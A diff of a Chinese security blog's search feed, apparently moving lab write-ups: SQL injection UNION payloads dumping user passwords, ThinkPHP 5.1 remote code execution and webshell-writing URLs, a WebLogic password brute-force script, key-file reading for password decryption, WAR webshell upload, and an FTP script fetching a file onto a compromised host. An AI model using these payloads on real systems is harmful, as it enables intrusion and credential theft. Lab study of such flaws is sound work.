-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; --+</code><br><img src="/posts/42669/sql10.jpg" alt><br><strong>hex编码数据库</strong><br>如果嫌单引号括起来麻烦的话，那么巧了！这里还有一个更麻烦的方法，就是将数据库名进行<code>hex</code>编码处理。<br>使用火狐自带的<code>HackBar</code>插件可以快速的进行<code>hex</code>编码:<br><img src="/posts/42669/sql11.gif" alt></p>
-<p>hex编码后在前面加上0x表明这里是16进制编码。</p>
-<p><img src="/posts/42669/sql12.jpg" alt></p>
-<h3 id="查询列名"><a href="#查询列名" class="headerlink" title="查询列名"></a>查询列名</h3><p>目前收集到的信息为:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库名称: securuty</span><br><span class="line">数据库表名: emails,referers,uagents,users</span><br></pre></td></tr></table></figure>
-<p>这几个表中 一般我们都会去 继续猜解<code>users</code>表。</p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
-<p><img src="/posts/42669/sql13.jpg" alt></p>
-<h3 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h3><p>知道了数据库、表名、各个字段名可以直接进行查询了，不需借助<code>information_schanem</code>数据库了。</p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users --+</code></p>
-<p><img src="/posts/42669/sql14.jpg" alt></p>
-<h2 id="简单整理"><a href="#简单整理" class="headerlink" title="简单整理"></a>简单整理</h2><p><code>order by –-+ 判断字段数目</code></p>
-<p><code>union select –-+ 联合查询收集信息</code></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,database() –-+ 查询当前数据库</code></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –-+查询所有数据库</code></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –-+ 查询表名</code></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’ –-+ 查询列名</code></p>
-<p><code>id=1&#39; and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users –-+ 查询字段值</code></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>thinkPHP5.1漏洞复现</title>
-    <url>/posts/36430.html</url>
-    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>。。。</p>
-<h2 id="0x01-docker复现"><a href="#0x01-docker复现" class="headerlink" title="0x01 docker复现"></a>0x01 docker复现</h2><p>这一块弄了好几天，一直不会用docker复现cms。</p>
-<p>利用官方lamp镜像，一开始用的镜像的PHP版本是5.5的，但是thinkPHP5.1需要PHP5.6以上，一直没有成功，后来换了一个镜像PHP7.3的，成功了！！！</p>
-<ol>
-<li>搜索lamp镜像<br><code>docker search lamp</code></li>
-<li>拉取镜像<br><code>docker pull mattrayner/lamp</code></li>
-<li>新建docker容器，并映射端口号<br><code>docker run -d -p [host port]:[docker port][image]</code></li>
-<li>查看运行中的docker容器<br><code>docker ps -a</code></li>
-<li>进入一个docker容器<br><code>docker exec -it [container id] bash</code></li>
-<li>拷贝本地文件到docker<br><code>docker cp [本地路径] [container id]:[container 路径]</code></li>
-<li>启动服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h2 id="0x02-命令执行漏洞利用"><a href="#0x02-命令执行漏洞利用" class="headerlink" title="0x02 命令执行漏洞利用"></a>0x02 命令执行漏洞利用</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thinkPHP5.1.1</span><br><span class="line">php 7.3 (必须5.6+)</span><br><span class="line">靶机IP： 192.168.72.131:89</span><br></pre></td></tr></table></figure>
-
-<h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
-<p><img src="/posts/36430/0.png" alt></p>
-<p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
-<p><img src="/posts/36430/4.png" alt></p>
-<h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p><code>http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=ls%20-l</code></p>
-<p><img src="/posts/36430/2.png" alt></p>
-<p><code>http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=whoami</code><br><img src="/posts/36430/3.png" alt></p>
-<h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="文件写入："></a>文件写入：</h3><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=%3C?php%20phpinfo();?%3E</code></p>
-<p>访问：<br><code>http://192.168.72.131:89/tp5.1/public/shell.php</code></p>
-<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><ol>
-<li>更新thinkPHP版本</li>
-<li>手工修复<br>根据官方给出的方案进行代码修改。<br><a href="https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776</a></li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入之盲注</title>
     <url>/posts/24339.html</url>
     <content><![CDATA[<h2 id="0x00-基于布尔盲注"><a href="#0x00-基于布尔盲注" class="headerlink" title="0x00 基于布尔盲注"></a>0x00 基于布尔盲注</h2><p>截取字符串常用函数：<br>① MID(column_name,start[,length])      //截取字符串的一部分</p>
@@ -2138,6 +2098,46 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>thinkPHP5.1漏洞复现</title>
+    <url>/posts/36430.html</url>
+    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>。。。</p>
+<h2 id="0x01-docker复现"><a href="#0x01-docker复现" class="headerlink" title="0x01 docker复现"></a>0x01 docker复现</h2><p>这一块弄了好几天，一直不会用docker复现cms。</p>
+<p>利用官方lamp镜像，一开始用的镜像的PHP版本是5.5的，但是thinkPHP5.1需要PHP5.6以上，一直没有成功，后来换了一个镜像PHP7.3的，成功了！！！</p>
+<ol>
+<li>搜索lamp镜像<br><code>docker search lamp</code></li>
+<li>拉取镜像<br><code>docker pull mattrayner/lamp</code></li>
+<li>新建docker容器，并映射端口号<br><code>docker run -d -p [host port]:[docker port][image]</code></li>
+<li>查看运行中的docker容器<br><code>docker ps -a</code></li>
+<li>进入一个docker容器<br><code>docker exec -it [container id] bash</code></li>
+<li>拷贝本地文件到docker<br><code>docker cp [本地路径] [container id]:[container 路径]</code></li>
+<li>启动服务<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line">service mysql start</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="0x02-命令执行漏洞利用"><a href="#0x02-命令执行漏洞利用" class="headerlink" title="0x02 命令执行漏洞利用"></a>0x02 命令执行漏洞利用</h2><h3 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">thinkPHP5.1.1</span><br><span class="line">php 7.3 (必须5.6+)</span><br><span class="line">靶机IP： 192.168.72.131:89</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码执行："><a href="#代码执行：" class="headerlink" title="代码执行："></a>代码执行：</h3><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code></p>
+<p><img src="/posts/36430/0.png" alt></p>
+<p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></p>
+<p><img src="/posts/36430/4.png" alt></p>
+<h3 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h3><p><code>http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=ls%20-l</code></p>
+<p><img src="/posts/36430/2.png" alt></p>
+<p><code>http://192.168.72.131:89/tp5.1/public/index.php?s=index/\think\Container/invokeFunction&amp;function=call_user_func_array&amp;vars[]=system&amp;vars[1][]=whoami</code><br><img src="/posts/36430/3.png" alt></p>
+<h3 id="文件写入："><a href="#文件写入：" class="headerlink" title="文件写入："></a>文件写入：</h3><p><code>http://192.168.72.131:89/tp5.1/public/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=%3C?php%20phpinfo();?%3E</code></p>
+<p>访问：<br><code>http://192.168.72.131:89/tp5.1/public/shell.php</code></p>
+<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><ol>
+<li>更新thinkPHP版本</li>
+<li>手工修复<br>根据官方给出的方案进行代码修改。<br><a href="https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/f0f9fc71b8b3716bd2abdf9518bcdf1897bb776</a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tomcat复现之远程代码执行漏洞</title>
     <url>/posts/21635.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（默认关闭），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
@@ -2198,107 +2198,6 @@ string substr(string, start, length)
 </li>
 <li><p>输入密码，get shell！！！</p>
 <p><img src="/posts/30841/2.png" alt="get shell"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>weblogic复现之weak_password</title>
-    <url>/posts/39385.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次复现漏洞，从网上找了很多资料，基于vulhub中的weblogic的weak_password漏洞。这次顺便把漏洞复现的过程也写一下。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Docker安装-Ubuntu-16-04"><a href="#Docker安装-Ubuntu-16-04" class="headerlink" title="Docker安装(Ubuntu 16.04)"></a>Docker安装(Ubuntu 16.04)</h3><h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
-<li><p>进入weblogic中的weak_password环境目录</p>
-<p><code>cd vulhub-master/weblogic/weak_password</code></p>
-</li>
-<li><p>构建服务</p>
-<p><code>sudo docker-compose build</code></p>
-</li>
-<li><p>启动环境</p>
-<p><code>sudo docker-compose up -d</code></p>
-</li>
-<li><p>进入网址，查看是否部署成功</p>
-<p><code>http://your-ip:7001/console</code></p>
-</li>
-<li><p>本环境弱口令账号密码为</p>
-<ul>
-<li>账号： weblogic</li>
-<li>密码： Oracle@123</li>
-</ul>
-</li>
-</ul>
-<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><h3 id="Weblogic常见弱口令总结"><a href="#Weblogic常见弱口令总结" class="headerlink" title="Weblogic常见弱口令总结"></a>Weblogic常见弱口令总结</h3><ul>
-<li>system:password        </li>
-<li>weblogic:weblogic        </li>
-<li>admin:secruity</li>
-<li>joe:password        </li>
-<li>mary:password        </li>
-<li>system:sercurity</li>
-<li>wlcsystem:wlcsystem        </li>
-<li>weblogic:Oracle@123</li>
-</ul>
-<h3 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h3><ol>
-<li><p>访问后台登录地址，输入任意账号密码，Burpsuite抓包</p>
-<p> <img src="/posts/39385/1.jpg" alt></p>
-</li>
-<li><p>点击右键，将其转发到Intruder模块下,设置数据</p>
-<p> <img src="/posts/39385/2.png" alt></p>
-<p> <img src="/posts/39385/3.png" alt="账号设置"></p>
-<p> <img src="/posts/39385/4.png" alt="密码设置"></p>
-</li>
-<li><p>开始爆破</p>
-<p> <img src="/posts/39385/5.png" alt></p>
-</li>
-</ol>
-<h3 id="Python脚本爆破"><a href="#Python脚本爆破" class="headerlink" title="Python脚本爆破"></a>Python脚本爆破</h3><p>Python小脚本的暴力破解思路和前面BurpSuite下的Intruder下的破解思路是一样的，换汤不换药。</p>
-<p>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def weakPasswd():</span><br><span class="line"></span><br><span class="line">        pwddict &#x3D; [&#39;WebLogic&#39;, &#39;weblogic&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;, &#39;security&#39;, &#39;joe&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data &#x3D; &#123;</span><br><span class="line">                    &#39;j_username&#39;:user,</span><br><span class="line">                    &#39;j_password&#39;:pwd,</span><br><span class="line">                    &#39;j_character_encoding&#39;:&#39;UTF-8&#39;</span><br><span class="line">                &#125;</span><br><span class="line">                #这个位置设置目标地址</span><br><span class="line">                req &#x3D; requests.post(&#39;http:&#x2F;&#x2F;your-ip&#39;+&#39;:7001&#x2F;console&#x2F;j_security_check&#39;, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">                if req.status_code &#x3D;&#x3D; 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text:</span><br><span class="line">                    print(&#39;[+] WebLogic username: &#39;+user+&#39;  password: &#39;+pwd)</span><br><span class="line"></span><br><span class="line">weakPasswd()</span><br></pre></td></tr></table></figure>
-
-<h3 id="配合任意文件下载-读取漏洞来破解密码"><a href="#配合任意文件下载-读取漏洞来破解密码" class="headerlink" title="配合任意文件下载/读取漏洞来破解密码"></a>配合任意文件下载/读取漏洞来破解密码</h3><p>如果没有弱口令漏洞怎么办呢？</p>
-<p>刚巧，这个环境下存在一个任意文件下载漏洞。</p>
-<p>漏洞地址：</p>
-<p><code>http://your-ip:7001/hello/file.jsp?path=</code></p>
-<ul>
-<li><p>读取后台用户密文与密钥文件</p>
-<p>  Weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。</p>
-<p>  这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml文件中。</p>
-<p>  Burpsuite抓包，在路径path后面输入，./security/SerializedSystemIni.dat 路径，成功拦截到包，将其转发到Repeater模块下，点击Go按钮，来读取加密密钥，返回包是一串数据，如图：</p>
-<p>  <img src="/posts/39385/6.png" alt></p>
-<p>  现在我们将这串数据保存在本地，选中数据，点击鼠标右键，点击copy to file，选择保存路径（记住这个路径），点击保存，如图：</p>
-<p>  <img src="/posts/39385/7.png" alt></p>
-<p>  此时，加密密钥我们已经保存下来了，接下来，要寻找加密的密码了，它在 ./config/config.xml文件下的<node-manager-password-encrypted> 标签下，如图：</node-manager-password-encrypted></p>
-<p>  <img src="/posts/39385/8.png" alt></p>
-</li>
-</ul>
-<ul>
-<li><p>使用工具对后台密码进行破解</p>
-<p>  现在，我们打开破解工具，具体位置上面已说到，文件处即为我们刚才保存的文件，密文即为./config/config.xml文件下的<node-manager-password-encrypted> 标签中的内容，全部输入完成后，点击确定，开始破解。</node-manager-password-encrypted></p>
-<p>  <img src="/posts/39385/9.png" alt></p>
-</li>
-</ul>
-<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><ol>
-<li><p>制作war包</p>
-<p>将webshell压缩成zip格式，修改后缀名为war即可</p>
-</li>
-<li><p>上传war包</p>
-<p>点击“部署”，“安装”</p>
-<p><img src="/posts/39385/10.png" alt></p>
-<p>上载文件</p>
-<p><img src="/posts/39385/11.png" alt></p>
-<p>选择文件，下一步</p>
-<p><img src="/posts/39385/12.png" alt></p>
-<p>下一步，“将此部署安装为应用程序”</p>
-<p>命名</p>
-<p><img src="/posts/39385/13.png" alt></p>
-<p>下一步，完成，保存</p>
-</li>
-<li><p>get shell</p>
-<p><img src="/posts/39385/14.png" alt></p>
 </li>
 </ol>
 ]]></content>
@@ -2425,6 +2324,107 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>weblogic复现之weak_password</title>
+    <url>/posts/39385.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我第一次复现漏洞，从网上找了很多资料，基于vulhub中的weblogic的weak_password漏洞。这次顺便把漏洞复现的过程也写一下。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="Docker安装-Ubuntu-16-04"><a href="#Docker安装-Ubuntu-16-04" class="headerlink" title="Docker安装(Ubuntu 16.04)"></a>Docker安装(Ubuntu 16.04)</h3><h3 id="vulhub安装"><a href="#vulhub安装" class="headerlink" title="vulhub安装"></a>vulhub安装</h3><h3 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h3><ul>
+<li><p>进入weblogic中的weak_password环境目录</p>
+<p><code>cd vulhub-master/weblogic/weak_password</code></p>
+</li>
+<li><p>构建服务</p>
+<p><code>sudo docker-compose build</code></p>
+</li>
+<li><p>启动环境</p>
+<p><code>sudo docker-compose up -d</code></p>
+</li>
+<li><p>进入网址，查看是否部署成功</p>
+<p><code>http://your-ip:7001/console</code></p>
+</li>
+<li><p>本环境弱口令账号密码为</p>
+<ul>
+<li>账号： weblogic</li>
+<li>密码： Oracle@123</li>
+</ul>
+</li>
+</ul>
+<h2 id="weak-password"><a href="#weak-password" class="headerlink" title="weak_password"></a>weak_password</h2><h3 id="Weblogic常见弱口令总结"><a href="#Weblogic常见弱口令总结" class="headerlink" title="Weblogic常见弱口令总结"></a>Weblogic常见弱口令总结</h3><ul>
+<li>system:password        </li>
+<li>weblogic:weblogic        </li>
+<li>admin:secruity</li>
+<li>joe:password        </li>
+<li>mary:password        </li>
+<li>system:sercurity</li>
+<li>wlcsystem:wlcsystem        </li>
+<li>weblogic:Oracle@123</li>
+</ul>
+<h3 id="Burpsuite爆破"><a href="#Burpsuite爆破" class="headerlink" title="Burpsuite爆破"></a>Burpsuite爆破</h3><ol>
+<li><p>访问后台登录地址，输入任意账号密码，Burpsuite抓包</p>
+<p> <img src="/posts/39385/1.jpg" alt></p>
+</li>
+<li><p>点击右键，将其转发到Intruder模块下,设置数据</p>
+<p> <img src="/posts/39385/2.png" alt></p>
+<p> <img src="/posts/39385/3.png" alt="账号设置"></p>
+<p> <img src="/posts/39385/4.png" alt="密码设置"></p>
+</li>
+<li><p>开始爆破</p>
+<p> <img src="/posts/39385/5.png" alt></p>
+</li>
+</ol>
+<h3 id="Python脚本爆破"><a href="#Python脚本爆破" class="headerlink" title="Python脚本爆破"></a>Python脚本爆破</h3><p>Python小脚本的暴力破解思路和前面BurpSuite下的Intruder下的破解思路是一样的，换汤不换药。</p>
+<p>脚本如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def weakPasswd():</span><br><span class="line"></span><br><span class="line">        pwddict &#x3D; [&#39;WebLogic&#39;, &#39;weblogic&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;, &#39;security&#39;, &#39;joe&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;]</span><br><span class="line">        for user in pwddict:</span><br><span class="line">            for pwd in pwddict:</span><br><span class="line">                data &#x3D; &#123;</span><br><span class="line">                    &#39;j_username&#39;:user,</span><br><span class="line">                    &#39;j_password&#39;:pwd,</span><br><span class="line">                    &#39;j_character_encoding&#39;:&#39;UTF-8&#39;</span><br><span class="line">                &#125;</span><br><span class="line">                #这个位置设置目标地址</span><br><span class="line">                req &#x3D; requests.post(&#39;http:&#x2F;&#x2F;your-ip&#39;+&#39;:7001&#x2F;console&#x2F;j_security_check&#39;, data&#x3D;data)</span><br><span class="line"></span><br><span class="line">                if req.status_code &#x3D;&#x3D; 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text:</span><br><span class="line">                    print(&#39;[+] WebLogic username: &#39;+user+&#39;  password: &#39;+pwd)</span><br><span class="line"></span><br><span class="line">weakPasswd()</span><br></pre></td></tr></table></figure>
+
+<h3 id="配合任意文件下载-读取漏洞来破解密码"><a href="#配合任意文件下载-读取漏洞来破解密码" class="headerlink" title="配合任意文件下载/读取漏洞来破解密码"></a>配合任意文件下载/读取漏洞来破解密码</h3><p>如果没有弱口令漏洞怎么办呢？</p>
+<p>刚巧，这个环境下存在一个任意文件下载漏洞。</p>
+<p>漏洞地址：</p>
+<p><code>http://your-ip:7001/hello/file.jsp?path=</code></p>
+<ul>
+<li><p>读取后台用户密文与密钥文件</p>
+<p>  Weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。</p>
+<p>  这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml文件中。</p>
+<p>  Burpsuite抓包，在路径path后面输入，./security/SerializedSystemIni.dat 路径，成功拦截到包，将其转发到Repeater模块下，点击Go按钮，来读取加密密钥，返回包是一串数据，如图：</p>
+<p>  <img src="/posts/39385/6.png" alt></p>
+<p>  现在我们将这串数据保存在本地，选中数据，点击鼠标右键，点击copy to file，选择保存路径（记住这个路径），点击保存，如图：</p>
+<p>  <img src="/posts/39385/7.png" alt></p>
+<p>  此时，加密密钥我们已经保存下来了，接下来，要寻找加密的密码了，它在 ./config/config.xml文件下的<node-manager-password-encrypted> 标签下，如图：</node-manager-password-encrypted></p>
+<p>  <img src="/posts/39385/8.png" alt></p>
+</li>
+</ul>
+<ul>
+<li><p>使用工具对后台密码进行破解</p>
+<p>  现在，我们打开破解工具，具体位置上面已说到，文件处即为我们刚才保存的文件，密文即为./config/config.xml文件下的<node-manager-password-encrypted> 标签中的内容，全部输入完成后，点击确定，开始破解。</node-manager-password-encrypted></p>
+<p>  <img src="/posts/39385/9.png" alt></p>
+</li>
+</ul>
+<h2 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h2><ol>
+<li><p>制作war包</p>
+<p>将webshell压缩成zip格式，修改后缀名为war即可</p>
+</li>
+<li><p>上传war包</p>
+<p>点击“部署”，“安装”</p>
+<p><img src="/posts/39385/10.png" alt></p>
+<p>上载文件</p>
+<p><img src="/posts/39385/11.png" alt></p>
+<p>选择文件，下一步</p>
+<p><img src="/posts/39385/12.png" alt></p>
+<p>下一步，“将此部署安装为应用程序”</p>
+<p>命名</p>
+<p><img src="/posts/39385/13.png" alt></p>
+<p>下一步，完成，保存</p>
+</li>
+<li><p>get shell</p>
+<p><img src="/posts/39385/14.png" alt></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>内网文件下载传输</title>
     <url>/posts/31532.html</url>
     <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
@@ -2541,43 +2541,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>常见加解密总结</title>
-    <url>/posts/56330.html</url>
-    <content><![CDATA[<h2 id="0x00-base64"><a href="#0x00-base64" class="headerlink" title="0x00  base64"></a>0x00  base64</h2><p>Base64就是用64个可显示字符表示所有的ASCii字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现<strong>1或2个’=’</strong></p>
-<p>形式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY&#x3D;</span><br></pre></td></tr></table></figure>
-<p><a href="http://www1.tc711.com/tool/BASE64.htm" target="_blank" rel="noopener">base64在线加解密</a></p>
-<h2 id="0x01-base32"><a href="#0x01-base32" class="headerlink" title="0x01 base32"></a>0x01 base32</h2><p>Base32是用32个字符表示256个ASCii字符，也就是说5个ASCii字符一组可以生成8个Base字符。</p>
-<h2 id="0x02-培根密码"><a href="#0x02-培根密码" class="headerlink" title="0x02 培根密码"></a>0x02 培根密码</h2><p>培根密码实际上就是一种替换密码，根据所给表一一对应转换即可加密解密 。<br>它的特殊之处在于：可以通过不明显的特征来隐藏密码信息，比如大小写、正斜体等，只要两个不同的属性，密码即可隐藏.需要注意的是输入的都应该是<strong>全小写字母或全大写字母</strong>。</p>
-<p>第一种方式</p>
-<p>A aaaaa B aaaab C aaaba D aaabb<br>E aabaa F aabab G aabba H aabbb<br>I abaaa J abaab K ababa L ababb<br>M abbaa N abbab O abbba P abbbb<br>Q baaaa R baaab S baaba T baabb<br>U babaa V babab W babba X babbb<br>Y bbaaa Z bbaab</p>
-<p>第二种方式</p>
-<p>a AAAAA g AABBA n ABBAA t BAABA<br>b AAAAB h AABBB o ABBAB u-v BAABB<br>c AAABA i-j ABAAA p ABBBA w BABAA<br>d AAABB k ABAAB q ABBBB x BABAB<br>e AABAA l ABABA r BAAAA y BABBA<br>f AABAB m ABABB s BAAAB z BABBB</p>
-<h2 id="0x03-摩斯密码"><a href="#0x03-摩斯密码" class="headerlink" title="0x03 摩斯密码"></a>0x03 摩斯密码</h2><p>摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p>
-<p>形式：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">– — .-. … .</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.imgur.com/Ar0vSSx.png" alt></p>
-<p><a href="https://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">摩斯密码在线加解密</a></p>
-<h2 id="0x04-JsFuck"><a href="#0x04-JsFuck" class="headerlink" title="0x04 JsFuck"></a>0x04 JsFuck</h2><p>JSFuck 可以只用6个字符 !+ 来编写 JavaScript 程序。</p>
-<p>形式：</p>
